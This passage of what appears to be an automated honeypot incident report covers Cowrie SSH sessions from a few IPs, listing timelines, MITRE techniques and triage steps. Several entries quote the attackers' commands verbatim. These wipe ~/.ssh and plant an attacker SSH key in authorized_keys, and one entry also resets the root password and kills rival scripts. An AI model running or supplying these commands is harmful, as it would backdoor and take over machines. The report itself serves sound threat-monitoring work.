**Recommended Actions:**
- [ ] Submit `27.128.240[.]75` to AbuseIPDB if not already reported
- [ ] Block `27.128.240[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cf0f490bff4

| Field | Detail |
|---|---|
| **Source IP** | `201.77.124[.]248` |
| **First Seen** | 2026-04-13 19:54 |
| **Last Seen** | 2026-04-13 19:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:54:56` | `cowrie.session.connect` |
| `2026-04-13 19:54:56` | `cowrie.client.version` |
| `2026-04-13 19:54:56` | `cowrie.client.kex` |
| `2026-04-13 19:54:57` | `cowrie.login.success` |
| `2026-04-13 19:54:58` | `cowrie.session.params` |
| `2026-04-13 19:54:58` | `cowrie.command.input` |
| `2026-04-13 19:54:58` | `cowrie.command.failed` |
| `2026-04-13 19:54:59` | `cowrie.log.closed` |
| `2026-04-13 19:55:00` | `cowrie.session.params` |
| `2026-04-13 19:55:00` | `cowrie.command.input` |
| `2026-04-13 19:55:00` | `cowrie.session.file_download` |
| `2026-04-13 19:55:00` | `cowrie.log.closed` |
| `2026-04-13 19:55:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.77.124[.]248` to AbuseIPDB if not already reported
- [ ] Block `201.77.124[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-296f0ab76998

| Field | Detail |
|---|---|
| **Source IP** | `201.77.124[.]248` |
| **First Seen** | 2026-04-13 19:55 |
| **Last Seen** | 2026-04-13 19:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:55:04` | `cowrie.session.connect` |
| `2026-04-13 19:55:04` | `cowrie.client.version` |
| `2026-04-13 19:55:05` | `cowrie.client.kex` |
| `2026-04-13 19:55:06` | `cowrie.login.success` |
| `2026-04-13 19:55:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.77.124[.]248` to AbuseIPDB if not already reported
- [ ] Block `201.77.124[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed49e0f5e3da

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:57 |
| **Last Seen** | 2026-04-13 19:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:57:49` | `cowrie.session.connect` |
| `2026-04-13 19:57:49` | `cowrie.client.version` |
| `2026-04-13 19:57:49` | `cowrie.client.kex` |
| `2026-04-13 19:57:50` | `cowrie.login.success` |
| `2026-04-13 19:57:50` | `cowrie.session.params` |
| `2026-04-13 19:57:50` | `cowrie.command.input` |
| `2026-04-13 19:57:50` | `cowrie.command.failed` |
| `2026-04-13 19:57:50` | `cowrie.log.closed` |
| `2026-04-13 19:57:51` | `cowrie.session.params` |
| `2026-04-13 19:57:51` | `cowrie.command.input` |
| `2026-04-13 19:57:51` | `cowrie.session.file_download` |
| `2026-04-13 19:57:51` | `cowrie.log.closed` |
| `2026-04-13 19:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc68e1a32f3a

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:57 |
| **Last Seen** | 2026-04-13 19:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:57:54` | `cowrie.session.connect` |
| `2026-04-13 19:57:54` | `cowrie.client.version` |
| `2026-04-13 19:57:54` | `cowrie.client.kex` |
| `2026-04-13 19:57:54` | `cowrie.login.success` |
| `2026-04-13 19:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75b3a2397750

| Field | Detail |
|---|---|
| **Source IP** | `201.77.124[.]248` |
| **First Seen** | 2026-04-13 19:58 |
| **Last Seen** | 2026-04-13 19:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:58:37` | `cowrie.session.connect` |
| `2026-04-13 19:58:37` | `cowrie.client.version` |
| `2026-04-13 19:58:37` | `cowrie.client.kex` |
| `2026-04-13 19:58:39` | `cowrie.login.success` |
| `2026-04-13 19:58:39` | `cowrie.session.params` |
| `2026-04-13 19:58:39` | `cowrie.command.input` |
| `2026-04-13 19:58:39` | `cowrie.command.failed` |
| `2026-04-13 19:58:40` | `cowrie.log.closed` |
| `2026-04-13 19:58:40` | `cowrie.session.params` |
| `2026-04-13 19:58:40` | `cowrie.command.input` |
| `2026-04-13 19:58:41` | `cowrie.session.file_download` |
| `2026-04-13 19:58:41` | `cowrie.log.closed` |
| `2026-04-13 19:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.77.124[.]248` to AbuseIPDB if not already reported
- [ ] Block `201.77.124[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-505c49100a94

| Field | Detail |
|---|---|
| **Source IP** | `201.77.124[.]248` |
| **First Seen** | 2026-04-13 19:58 |
| **Last Seen** | 2026-04-13 19:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:58:45` | `cowrie.session.connect` |
| `2026-04-13 19:58:45` | `cowrie.client.version` |
| `2026-04-13 19:58:45` | `cowrie.client.kex` |
| `2026-04-13 19:58:46` | `cowrie.login.success` |
| `2026-04-13 19:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.77.124[.]248` to AbuseIPDB if not already reported
- [ ] Block `201.77.124[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea514da6cf15

| Field | Detail |
|---|---|
| **Source IP** | `201.77.124[.]248` |
| **First Seen** | 2026-04-13 20:00 |
| **Last Seen** | 2026-04-13 20:00 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 20:00:25` | `cowrie.session.connect` |
| `2026-04-13 20:00:25` | `cowrie.client.version` |
| `2026-04-13 20:00:25` | `cowrie.client.kex` |
| `2026-04-13 20:00:27` | `cowrie.login.success` |
| `2026-04-13 20:00:28` | `cowrie.session.params` |
| `2026-04-13 20:00:28` | `cowrie.command.input` |
| `2026-04-13 20:00:28` | `cowrie.command.failed` |
| `2026-04-13 20:00:28` | `cowrie.log.closed` |
| `2026-04-13 20:00:29` | `cowrie.session.params` |
| `2026-04-13 20:00:29` | `cowrie.command.input` |
| `2026-04-13 20:00:29` | `cowrie.session.file_download` |
| `2026-04-13 20:00:29` | `cowrie.log.closed` |
| `2026-04-13 20:00:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.77.124[.]248` to AbuseIPDB if not already reported
- [ ] Block `201.77.124[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33b4b5c583cb

| Field | Detail |
|---|---|
| **Source IP** | `201.77.124[.]248` |
| **First Seen** | 2026-04-13 20:00 |
| **Last Seen** | 2026-04-13 20:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 20:00:33` | `cowrie.session.connect` |
| `2026-04-13 20:00:33` | `cowrie.client.version` |
| `2026-04-13 20:00:34` | `cowrie.client.kex` |
| `2026-04-13 20:00:35` | `cowrie.login.success` |
| `2026-04-13 20:00:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.77.124[.]248` to AbuseIPDB if not already reported
- [ ] Block `201.77.124[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca9a963bd8e3

| Field | Detail |
|---|---|
| **Source IP** | `27.128.240[.]75` |
| **First Seen** | 2026-04-13 20:03 |
| **Last Seen** | 2026-04-13 20:08 |
| **Session Duration** | 300s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:uTABOquoCFJI"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 20:03:58` | `cowrie.session.connect` |
| `2026-04-13 20:03:58` | `cowrie.client.version` |
| `2026-04-13 20:03:58` | `cowrie.client.kex` |
| `2026-04-13 20:03:59` | `cowrie.login.success` |
| `2026-04-13 20:03:59` | `cowrie.session.params` |
| `2026-04-13 20:03:59` | `cowrie.command.input` |
| `2026-04-13 20:03:59` | `cowrie.command.failed` |
| `2026-04-13 20:03:59` | `cowrie.log.closed` |
| `2026-04-13 20:04:00` | `cowrie.session.params` |
| `2026-04-13 20:04:00` | `cowrie.command.input` |
| `2026-04-13 20:04:00` | `cowrie.session.file_download` |
| `2026-04-13 20:04:00` | `cowrie.log.closed` |
| `2026-04-13 20:04:08` | `cowrie.session.params` |
| `2026-04-13 20:04:08` | `cowrie.command.input` |
| `2026-04-13 20:04:08` | `cowrie.log.closed` |
| `2026-04-13 20:04:09` | `cowrie.session.params` |
| `2026-04-13 20:04:09` | `cowrie.command.input` |
| `2026-04-13 20:04:09` | `cowrie.log.closed` |
| `2026-04-13 20:04:09` | `cowrie.session.params` |
| `2026-04-13 20:04:09` | `cowrie.command.input` |
| `2026-04-13 20:04:10` | `cowrie.session.file_download` |
| `2026-04-13 20:04:10` | `cowrie.log.closed` |
| `2026-04-13 20:04:10` | `cowrie.session.params` |
| `2026-04-13 20:04:10` | `cowrie.command.input` |
| `2026-04-13 20:04:10` | `cowrie.log.closed` |
| `2026-04-13 20:04:10` | `cowrie.session.params` |
| `2026-04-13 20:04:10` | `cowrie.command.input` |
| `2026-04-13 20:04:11` | `cowrie.log.closed` |
| `2026-04-13 20:04:11` | `cowrie.session.params` |
| `2026-04-13 20:04:11` | `cowrie.command.input` |
| `2026-04-13 20:04:11` | `cowrie.command.input` |
| `2026-04-13 20:04:11` | `cowrie.log.closed` |
| `2026-04-13 20:04:12` | `cowrie.session.params` |
| `2026-04-13 20:04:12` | `cowrie.command.input` |
| `2026-04-13 20:04:12` | `cowrie.log.closed` |
| `2026-04-13 20:04:12` | `cowrie.session.params` |
| `2026-04-13 20:04:12` | `cowrie.command.input` |
| `2026-04-13 20:08:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.240[.]75` to AbuseIPDB if not already reported
- [ ] Block `27.128.240[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7493299bad6

| Field | Detail |
|---|---|
| **Source IP** | `201.77.124[.]248` |
| **First Seen** | 2026-04-13 20:04 |
| **Last Seen** | 2026-04-13 20:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 20:04:02` | `cowrie.session.connect` |
| `2026-04-13 20:04:02` | `cowrie.client.version` |
| `2026-04-13 20:04:03` | `cowrie.client.kex` |
| `2026-04-13 20:04:04` | `cowrie.login.success` |
| `2026-04-13 20:04:05` | `cowrie.session.params` |
| `2026-04-13 20:04:05` | `cowrie.command.input` |
| `2026-04-13 20:04:05` | `cowrie.command.failed` |
| `2026-04-13 20:04:05` | `cowrie.log.closed` |
| `2026-04-13 20:04:06` | `cowrie.session.params` |
| `2026-04-13 20:04:06` | `cowrie.command.input` |
| `2026-04-13 20:04:06` | `cowrie.session.file_download` |
| `2026-04-13 20:04:06` | `cowrie.log.closed` |
| `2026-04-13 20:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.77.124[.]248` to AbuseIPDB if not already reported
- [ ] Block `201.77.124[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4acaff6b8369

| Field | Detail |
|---|---|
| **Source IP** | `201.77.124[.]248` |
| **First Seen** | 2026-04-13 20:04 |
| **Last Seen** | 2026-04-13 20:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 20:04:10` | `cowrie.session.connect` |
| `2026-04-13 20:04:10` | `cowrie.client.version` |
| `2026-04-13 20:04:10` | `cowrie.client.kex` |
| `2026-04-13 20:04:12` | `cowrie.login.success` |
| `2026-04-13 20:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.77.124[.]248` to AbuseIPDB if not already reported
- [ ] Block `201.77.124[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33a25f884c27

| Field | Detail |
|---|---|
| **Source IP** | `27.128.240[.]75` |
| **First Seen** | 2026-04-13 20:05 |
| **Last Seen** | 2026-04-13 20:10 |
| **Session Duration** | 304s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 20:05:29` | `cowrie.session.connect` |
| `2026-04-13 20:05:29` | `cowrie.client.version` |
| `2026-04-13 20:05:30` | `cowrie.client.kex` |
| `2026-04-13 20:05:34` | `cowrie.login.success` |
| `2026-04-13 20:10:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.240[.]75` to AbuseIPDB if not already reported
- [ ] Block `27.128.240[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48e29025065e

| Field | Detail |
|---|---|
| **Source IP** | `27.128.240[.]75` |
| **First Seen** | 2026-04-13 20:05 |
| **Last Seen** | 2026-04-13 20:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 20:05:53` | `cowrie.session.connect` |
| `2026-04-13 20:05:53` | `cowrie.client.version` |
| `2026-04-13 20:05:53` | `cowrie.client.kex` |
| `2026-04-13 20:05:53` | `cowrie.login.success` |
| `2026-04-13 20:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.240[.]75` to AbuseIPDB if not already reported
- [ ] Block `27.128.240[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2087885c852c

| Field | Detail |
|---|---|
| **Source IP** | `27.128.240[.]75` |
| **First Seen** | 2026-04-13 20:06 |
| **Last Seen** | 2026-04-13 20:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 20:06:32` | `cowrie.session.connect` |
| `2026-04-13 20:06:32` | `cowrie.client.version` |
| `2026-04-13 20:06:33` | `cowrie.client.kex` |
| `2026-04-13 20:06:33` | `cowrie.login.success` |
| `2026-04-13 20:06:34` | `cowrie.session.params` |
| `2026-04-13 20:06:34` | `cowrie.command.input` |
| `2026-04-13 20:06:34` | `cowrie.command.failed` |
| `2026-04-13 20:06:34` | `cowrie.log.closed` |
| `2026-04-13 20:06:34` | `cowrie.session.params` |
| `2026-04-13 20:06:34` | `cowrie.command.input` |
| `2026-04-13 20:06:34` | `cowrie.session.file_download` |
| `2026-04-13 20:06:34` | `cowrie.log.closed` |
| `2026-04-13 20:06:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.240[.]75` to AbuseIPDB if not already reported
- [ ] Block `27.128.240[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d95c52abbca5

| Field | Detail |
|---|---|
| **Source IP** | `27.128.240[.]75` |
| **First Seen** | 2026-04-13 20:06 |
| **Last Seen** | 2026-04-13 20:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 20:06:41` | `cowrie.session.connect` |
| `2026-04-13 20:06:41` | `cowrie.client.version` |
| `2026-04-13 20:06:41` | `cowrie.client.kex` |
| `2026-04-13 20:06:41` | `cowrie.login.success` |
| `2026-04-13 20:06:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.240[.]75` to AbuseIPDB if not already reported
- [ ] Block `27.128.240[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12fce051c28f

| Field | Detail |
|---|---|
| **Source IP** | `201.77.124[.]248` |
| **First Seen** | 2026-04-13 20:07 |
| **Last Seen** | 2026-04-13 20:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 20:07:42` | `cowrie.session.connect` |
| `2026-04-13 20:07:42` | `cowrie.client.version` |
| `2026-04-13 20:07:42` | `cowrie.client.kex` |
| `2026-04-13 20:07:43` | `cowrie.login.success` |
| `2026-04-13 20:07:44` | `cowrie.session.params` |
| `2026-04-13 20:07:44` | `cowrie.command.input` |
| `2026-04-13 20:07:44` | `cowrie.command.failed` |
| `2026-04-13 20:07:45` | `cowrie.log.closed` |
| `2026-04-13 20:07:45` | `cowrie.session.params` |
| `2026-04-13 20:07:45` | `cowrie.command.input` |
